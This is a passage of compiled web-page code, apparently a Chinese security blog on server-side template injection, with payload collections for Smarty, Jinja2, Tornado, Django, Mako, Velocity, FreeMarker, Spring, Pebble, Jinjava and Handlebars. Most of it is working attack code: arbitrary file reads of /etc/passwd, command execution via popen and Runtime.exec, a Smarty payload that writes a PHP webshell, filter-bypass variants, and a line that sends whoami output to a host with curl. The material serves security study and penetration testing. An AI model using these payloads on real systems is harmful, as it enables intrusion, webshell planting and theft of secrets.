payloads"})}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"smarty",children:"Smarty"}),"\n",(0,l.jsxs)(n.p,{children:["Smarty\u662f\u6700\u6d41\u884c\u7684PHP\u6a21\u677f\u8bed\u8a00\u4e4b\u4e00\uff0c\u4e3a\u4e0d\u53d7\u4fe1\u4efb\u7684\u6a21\u677f\u6267\u884c\u63d0\u4f9b\u4e86\u5b89\u5168\u6a21\u5f0f\u3002\u8fd9\u4f1a\u5f3a\u5236\u6267\u884c\u5728 php \u5b89\u5168\u51fd\u6570\u767d\u540d\u5355\u4e2d\u7684\u51fd\u6570\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u6a21\u677f\u4e2d\u65e0\u6cd5\u76f4\u63a5\u8c03\u7528 php \u4e2d\u76f4\u63a5\u6267\u884c\u547d\u4ee4\u7684\u51fd\u6570(\u76f8\u5f53\u4e8e\u5b58\u5728\u4e86\u4e00\u4e2a",(0,l.jsx)(n.code,{children:"disable_function"}),")"]}),"\n",(0,l.jsxs)(n.p,{children:["\u4f46\u662f\uff0c\u5b9e\u9645\u4e0a\u5bf9\u8bed\u8a00\u7684\u9650\u5236\u5e76\u4e0d\u80fd\u5f71\u54cd\u6211\u4eec\u6267\u884c\u547d\u4ee4\uff0c\u56e0\u4e3a\u6211\u4eec\u9996\u5148\u8003\u8651\u7684\u5e94\u8be5\u662f\u6a21\u677f\u672c\u8eab\uff0c\u6070\u597d Smarty \u5f88\u7167\u987e\u6211\u4eec\uff0c\u5728\u9605\u8bfb",(0,l.jsx)(n.a,{href:"https://github.com/smarty-php/smarty",children:"\u6a21\u677f\u7684\u6587\u6863"}),"\u4ee5\u540e\u6211\u4eec\u53d1\u73b0\uff1a$smarty\u5185\u7f6e\u53d8\u91cf\u53ef\u7528\u4e8e\u8bbf\u95ee\u5404\u79cd\u73af\u5883\u53d8\u91cf\uff1b"]}),"\n",(0,l.jsxs)(n.p,{children:["\u6bd4\u5982\u6211\u4eec\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"self"})," \u5f97\u5230 ",(0,l.jsx)(n.code,{children:"smarty"})," \u8fd9\u4e2a\u7c7b\u4ee5\u540e\u6211\u4eec\u5c31\u53bb\u627e ",(0,l.jsx)(n.code,{children:"smarty"})," \u7ed9\u6211\u4eec\u7684\u7684\u65b9\u6cd5\uff1a"]}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.a,{href:"https://github.com/smarty-php/smarty/blob/v3.1.11/libs/sysplugins/smarty_internal_data.php",children:"https://github.com/smarty-php/smarty/blob/v3.1.11/libs/sysplugins/smarty_internal_data.php"})," \u4e2d\u7684 ",(0,l.jsx)(n.code,{children:"getStreamVariable()"})," \u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6\u4f20\u5165\u53d8\u91cf\u7684\u6d41"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211104113918775",src:s(38730).A+"",width:"1766",height:"1038"})}),"\n",(0,l.jsx)(n.p,{children:"\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\u8bfb\u6587\u4ef6\uff0cpayload:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-Smarty",children:'{self::getStreamVariable("file:///etc/passwd")}\n'})}),"\n",(0,l.jsx)(n.hr,{}),"\n",(0,l.jsx)(n.p,{children:"\u5b9e\u5728\u6ca1\u627e\u5230\u73af\u5883\u600e\u4e48\u642d\u5efa\uff0c\u8fd9\u91cc\u6536\u96c6\u4e00\u4e0bPayload\u5427"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"{$smarty.version}  #\u83b7\u53d6smarty\u7684\u7248\u672c\u53f7\n{php}phpinfo();{/php}  #\u6267\u884c\u76f8\u5e94\u7684php\u4ee3\u7801\uff0c\u5728Smarty3\u7248\u672c\u4e2d\u5df2\u7ecf\u5e9f\u5f03{php}\u6807\u7b7e\uff0c\u5f3a\u70c8\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\u3002\u5728Smarty 3.1\uff0c{php}\u4ec5\u5728SmartyBC\u4e2d\u53ef\u7528\u3002\n{if phpinfo()}{/if}\t# \u6267\u884c\u76f8\u5e94\u7684php\u4ee3\u7801\n{self::getStreamVariable(\"file:///etc/passwd\")} # \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())} # \u6587\u4ef6\u5199\u5165\n{system('ls')} # compatible v3\n{system('cat index.php')} # compatible v3\n{literal}alert('xss');{/literal} # XSS\n"})}),"\n",(0,l.jsx)(n.hr,{}),"\n",(0,l.jsx)(n.p,{children:"\u53c2\u8003\u94fe\u63a5"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://err0r.top/article/ssti/#Smarty",children:"SSTI\u6a21\u677f\u6ce8\u5165"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#smarty-php",children:"ssti-server-side-template-injection#smarty-php"})}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"python\u4e2d\u7684ssti",children:"Python\u4e2d\u7684SSTI"}),"\n",(0,l.jsx)(n.h3,{id:"jinja2",children:"Jinja2"}),"\n",(0,l.jsx)(n.p,{children:"Jinja2\u662f\u4e00\u79cd\u9762\u5411Python\u7684\u73b0\u4ee3\u548c\u8bbe\u8ba1\u53cb\u597d\u7684\u6a21\u677f\u8bed\u8a00\uff0c\u5b83\u662f\u4ee5Django\u7684\u6a21\u677f\u4e3a\u6a21\u578b\u7684\uff0c\u662fFlask\u6846\u67b6\u7684\u4e00\u90e8\u5206\u3002"}),"\n",(0,l.jsx)(n.h4,{id:"\u57fa\u7840\u8bed\u6cd5-1",children:"\u57fa\u7840\u8bed\u6cd5"}),"\n",(0,l.jsxs)(n.p,{children:["\u548c",(0,l.jsx)(n.code,{children:"Twig"}),"\u7c7b\u4f3c"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{{ ... }}\uff1a\u88c5\u8f7d\u4e00\u4e2a\u53d8\u91cf\uff0c\u6a21\u677f\u6e32\u67d3\u7684\u65f6\u5019\uff0c\u4f1a\u4f7f\u7528\u4f20\u8fdb\u6765\u7684\u540c\u540d\u53c2\u6570\u8fd9\u4e2a\u53d8\u91cf\u4ee3\u8868\u7684\u503c\u66ff\u6362\u6389\u3002\n{% ... %}\uff1a\u88c5\u8f7d\u4e00\u4e2a\u63a7\u5236\u8bed\u53e5\u3002\n{# ... #}\uff1a\u88c5\u8f7d\u4e00\u4e2a\u6ce8\u91ca\uff0c\u6a21\u677f\u6e32\u67d3\u7684\u65f6\u5019\u4f1a\u5ffd\u89c6\u8fd9\u4e2d\u95f4\u7684\u503c\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u53d8\u91cf"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u6a21\u677f\u4e2d\u6dfb\u52a0\u53d8\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528\uff08set\uff09\u8bed\u53e5"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{% set name='xx' %}\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u521b\u5efa\u4e00\u4e2a\u5185\u90e8\u7684\u4f5c\u7528\u57df"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"with\u8bed\u53e5\u6765\u521b\u5efa\u4e00\u4e2a\u5185\u90e8\u7684\u4f5c\u7528\u57df\uff0c\u5c06set\u8bed\u53e5\u653e\u5728\u5176\u4e2d\uff0c\u8fd9\u6837\u521b\u5efa\u7684\u53d8\u91cf\u53ea\u5728with\u4ee3\u7801\u5757\u4e2d\u624d\u6709\u6548"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{% with gg = 42 %}\n{{ gg }}\n{% endwith %}\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"if \u8bed\u53e5"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{% if 1==1 %}\n{{ 7*7 }}\n{%else%}\n{{ 8*8 }}\n{% endif %}\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"for \u5faa\u73af"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{% for c in ['1','2','3'] %}\n{{c}}\n{%endfor%}\n"})}),"\n",(0,l.jsx)(n.h4,{id:"\u73af\u5883\u642d\u5efa-1",children:"\u73af\u5883\u642d\u5efa"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u4f9d\u8d56"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"Python 3.7.9"}),"\n",(0,l.jsx)(n.li,{children:"Flask 1.1.2"}),"\n",(0,l.jsx)(n.li,{children:"Jinja2 3.0.1"}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u6f14\u793a\u4ee3\u7801"}),"\n",(0,l.jsxs)(n.p,{children:["\u6211\u4eec\u4f20\u5165\u7684get\u53d8\u91cf",(0,l.jsx)(n.code,{children:"name"}),"\uff0c\u88ab\u5f53\u6210\u6a21\u7248\u5185\u5bb9\u4f20\u5165\u5230Jinja2\u8fdb\u884c\u6e32\u67d3\u3002"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"#!/usr/bin/env python\nfrom flask import Flask, request\nfrom jinja2 import Template\n\napp = Flask(__name__)\n\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'guest')\n\n    t = Template(\"Hello \" + name)\n    return t.render()\n\n\nif __name__ == \"__main__\":\n    app.run()\n"})}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u542f\u52a8\u73af\u5883"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"python3 jinja2_ssti.py\n"})}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"\u5927\u529f\u544a\u6210"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211104114007489",src:s(86444).A+"",width:"804",height:"170"})}),"\n",(0,l.jsx)(n.h4,{id:"\u6f0f\u6d1e\u5224\u5b9a",children:"\u6f0f\u6d1e\u5224\u5b9a"}),"\n",(0,l.jsxs)(n.p,{children:["\u6267\u884c\u6700\u7b80\u5355\u7684\u8868\u8fbe\u5f0f",(0,l.jsx)(n.code,{children:"{{2**10}}"})]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211104114023078",src:s(71958).A+"",width:"852",height:"180"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"${7*7} = ${7*7}\n{{foobar}} = Nothing\n{{4*4}}[[5*5]] = 16[[5*5]]\n{{7*'7'}} = 7777777\n{# \u4e0b\u9762\u662f\u9700\u8981\u5185\u90e8\u6709\u76f8\u5173\u53d8\u91cf\u624d\u80fd\u5f97\u5230\u7ed3\u679c #}\n{{config}}\n{{config.items()}}\n{{settings.SECRET_KEY}}\n{{settings}}\n{% debug %}\n"})}),"\n",(0,l.jsx)(n.h4,{id:"\u6df1\u5165\u4e86\u89e3",children:"\u6df1\u5165\u4e86\u89e3"}),"\n",(0,l.jsxs)(n.p,{children:["\u4e3b\u8981\u662f\u5229\u7528\u4e86Python\u7684\u9b54\u672f\u65b9\u6cd5\uff0c",(0,l.jsx)(n.strong,{children:"\u5177\u4f53\u53ef\u4ee5Google\u641c\u7d22\uff1apython\u6c99\u76d2\u9003\u9038 \u4e86\u89e3"}),"\uff0c\u7b80\u5355\u4ecb\u7ecd\u4e0b\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"__class__  \u8fd4\u56de\u793a\u4f8b\u6240\u5c5e\u7684\u7c7b\n__mro__    \u8fd4\u56de\u4e00\u4e2a\u7c7b\u6240\u7ee7\u627f\u7684\u57fa\u7c7b\u5143\u7ec4\uff0c\u65b9\u6cd5\u5728\u89e3\u6790\u65f6\u6309\u7167\u5143\u7ec4\u7684\u987a\u5e8f\u89e3\u6790\u3002\n__base__   \u8fd4\u56de\u4e00\u4e2a\u7c7b\u6240\u7ee7\u627f\u7684\u57fa\u7c7b\t# __base__\u548c__mro__\u90fd\u662f\u7528\u6765\u5bfb\u627e\u57fa\u7c7b\u7684\n__subclasses__   \u6bcf\u4e2a\u65b0\u7c7b\u90fd\u4fdd\u7559\u4e86\u5b50\u7c7b\u7684\u5f15\u7528\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4e2d\u4ecd\u7136\u53ef\u7528\u7684\u7684\u5f15\u7528\u5217\u8868\n__init__  \u7c7b\u7684\u521d\u59cb\u5316\u65b9\u6cd5\n__globals__  \u5bf9\u5305\u542b\u51fd\u6570\u5168\u5c40\u53d8\u91cf\u7684\u5b57\u5178\u7684\u5f15\u7528\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u901a\u8fc7\u8fd9\u4e9b\u9b54\u672f\u65b9\u6cd5\u7684\u7ec4\u5408\u6784\u9020\uff0c\u5c31\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u6267\u884c\u5230\u5404\u79cd\u5371\u9669\u65b9\u6cd5\uff0c\u6bd4\u5982\u8bfb\u6587\u4ef6\u3001\u6267\u884c\u7cfb\u7edf\u547d\u4ee4"}),"\n",(0,l.jsx)(n.p,{children:"\u6784\u9020\u7684Payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:" for c in [].__class__.__base__.__subclasses__():\n        if c.__name__ == 'catch_warnings':\n            for b in c.__init__.__globals__.values():\n                if b.__class__ == {}.__class__:\n                    if 'eval' in b.keys():\n                        print(b['eval']('__import__(\"os\").popen(\"id\").read()'))\n"})}),"\n",(0,l.jsx)(n.h4,{id:"\u52a0\u6df1\u5229\u7528",children:"\u52a0\u6df1\u5229\u7528"}),"\n",(0,l.jsx)(n.p,{children:"\u5c31\u662f\u7ed9\u4e0a\u9762\u6784\u9020\u51fa\u6765\u7684Payload\u8f6c\u6362\u6210Jinja2\u53ef\u4ee5\u6267\u884c\u7684\u8868\u8fbe\u5f0f"}),"\n",(0,l.jsx)(n.p,{children:"\u7ed3\u679c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'eval' in b.keys() %}\n      {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u538b\u7f29\u4e00\u884c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u67e5\u770b\u7ed3\u679c"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211104114042081",src:s(50359).A+"",width:"2900",height:"216"})}),"\n",(0,l.jsx)(n.p,{children:"\u5176\u4ed6\u7684\u4e00\u4e9bPayload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"whoami\").read()}}{%endif%}{% endfor %}\n\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}\n"})}),"\n",(0,l.jsx)(n.h4,{id:"\u7ed5\u8fc7",children:"\u7ed5\u8fc7"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.strong,{children:"\u8fc7\u6ee4["})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{# getitem\u3001pop #}\n{{ ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read() }}\n{{ ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read() }}\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.strong,{children:"\u8fc7\u6ee4\u5f15\u53f7"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{# chr\u51fd\u6570 #}\n{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}\n{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request\u5bf9\u8c61\n{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd\n\n{# \u547d\u4ee4\u6267\u884c #}\n{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}\n{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}\n{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.strong,{children:"\u8fc7\u6ee4\u4e0b\u5212\u7ebf"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.strong,{children:"\u8fc7\u6ee4\u82b1\u62ec\u53f7"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"#\u7528{%%}\u6807\u8bb0\n{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}\n"})}),"\n",(0,l.jsx)(n.h4,{id:"\u53c2\u8003-1",children:"\u53c2\u8003"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python",children:"ssti-server-side-template-injection#jinja2-python"})}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"tornado",children:"tornado"}),"\n",(0,l.jsxs)(n.p,{children:["tornado render\u662fpython\u4e2d\u7684\u4e00\u4e2a\u6e32\u67d3\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u4e00\u79cd\u6a21\u677f\uff0c\u901a\u8fc7\u8c03\u7528\u7684\u53c2\u6570\u4e0d\u540c\uff0c\u751f\u6210\u4e0d\u540c\u7684\u7f51\u9875\uff0c\u5982\u679c\u7528\u6237\u5bf9render\u5185\u5bb9\u53ef\u63a7\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u6ce8\u5165XSS\u4ee3\u7801\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u901a\u8fc7",(0,l.jsx)(n.code,{children:"{{}}"}),"\u8fdb\u884c\u4f20\u9012\u53d8\u91cf\u548c\u6267\u884c\u7b80\u5355\u7684\u8868\u8fbe\u5f0f\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{% import foobar %} = Error\n{% import os %}{{os.system('whoami')}}\n"})}),"\n",(0,l.jsx)(n.h3,{id:"djanjo",children:"Djanjo"}),"\n",(0,l.jsxs)(n.p,{children:['\u8fd9\u4e2a\u6bd4\u8f83\u96be\u5229\u7528\uff0c\u6761\u4ef6\u88ab\u9650\u5236\u7684\u5f88\u6b7b\uff0c\u5f88\u96be\u6267\u884c\u547d\u4ee4\uff1b\u4f46Django\u81ea\u5e26\u7684\u5e94\u7528 "admin"\uff08\u4e5f\u5c31\u662fDjango\u81ea\u5e26\u7684\u540e\u53f0\uff09\u7684',(0,l.jsx)(n.code,{children:"models.py"}),"\u4e2d\u5bfc\u5165\u4e86\u5f53\u524d\u7f51\u7ad9\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\uff0c\u627e\u5230Django\u9ed8\u8ba4\u5e94\u7528admin\u7684model\uff0c\u518d\u901a\u8fc7\u8fd9\u4e2amodel\u83b7\u53d6settings\u5bf9\u8c61\uff0c\u8fdb\u800c\u83b7\u53d6\u6570\u636e\u5e93\u8d26\u53f7\u5bc6\u7801\u3001Web\u52a0\u5bc6\u5bc6\u94a5\u7b49\u4fe1\u606f\u3002"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}\n{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}\n"})}),"\n",(0,l.jsx)(n.h3,{id:"mako",children:"Mako"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"<%\nimport os\nx=os.popen('id').read()\n%>\n${x}\n"})}),"\n",(0,l.jsx)(n.h2,{id:"java\u4e2d\u7684ssti",children:"Java\u4e2d\u7684SSTI"}),"\n",(0,l.jsx)(n.h3,{id:"velocity",children:"Velocity"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-velocity",children:'#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()\t// CVE-2019-3396\n#set($str=$class.inspect("java.lang.String").type)\n#set($chr=$class.inspect("java.lang.Character").type)\n#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end\n'})}),"\n",(0,l.jsx)(n.h3,{id:"freemarker",children:"FreeMarker"}),"\n",(0,l.jsxs)(n.p,{children:["\u5728\u7ebf\u6d4b\u8bd5\u7f51\u7ad9\uff1a",(0,l.jsx)(n.a,{href:"https://try.freemarker.apache.org",children:"https://try.freemarker.apache.org"})]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u57fa\u7840Payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{{7*7}} = {{7*7}}\n${7*7} = 49\n#{7*7} = 49 -- (legacy)\n${7*'7'} Nothing\n${foobar}\n"})}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u9ad8\u7ea7Payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:'<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}\n[#assign ex = \'freemarker.template.utility.Execute\'?new()]${ ex(\'id\')}\n${"freemarker.template.utility.Execute"?new()("id")}\n\n${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/home/carlos/my_password.txt\').toURL().openStream().readAllBytes()?join(" ")}\n'})}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"spring-view-manipulation",children:"Spring View Manipulation"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:'__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x\n__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x\n'})}),"\n",(0,l.jsx)(n.h3,{id:"pebble",children:"Pebble"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u57fa\u7840Payload"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"{{ someString.toUPPERCASE() }}\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u4f4e\u7248\u672cPebble (< version 3.0.9)"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u9ad8\u7248\u672c"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"{% set cmd = 'id' %}\n{% set bytes = (1).TYPE\n     .forName('java.lang.Runtime')\n     .methods[6]\n     .invoke(null,null)\n     .exec(cmd)\n     .inputStream\n     .readAllBytes() %}\n{{ (1).TYPE\n     .forName('java.lang.String')\n     .constructors[0]\n     .newInstance(([bytes]).toArray()) }}\n"})}),"\n",(0,l.jsx)(n.h3,{id:"jinjava",children:"Jinjava"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{{'a'.toUpperCase()}} = 'A'\n{{ request }} = \u4f1a\u8fd4\u56de\u4e00\u4e2arequest\u5bf9\u8c61\u5f62\u5982 com.[...].context.TemplateContextRequest@23548206\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u547d\u4ee4\u6267\u884c\uff08\u88ab\u4fee\u590d\uff1a",(0,l.jsx)(n.a,{href:"https://github.com/HubSpot/jinjava/pull/230%EF%BC%89",children:"https://github.com/HubSpot/jinjava/pull/230\uff09"})]}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\n"})}),"\n",(0,l.jsx)(n.h2,{id:"nodejs\u4e2d\u7684ssti",children:"NodeJS\u4e2d\u7684SSTI"}),"\n",(0,l.jsx)(n.h3,{id:"handlebars",children:"Handlebars"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:'{{#with "s" as |string|}}\n  {{#with "e"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub "constructor")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push "return require(\'child_process\').exec(\'whoami\');"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  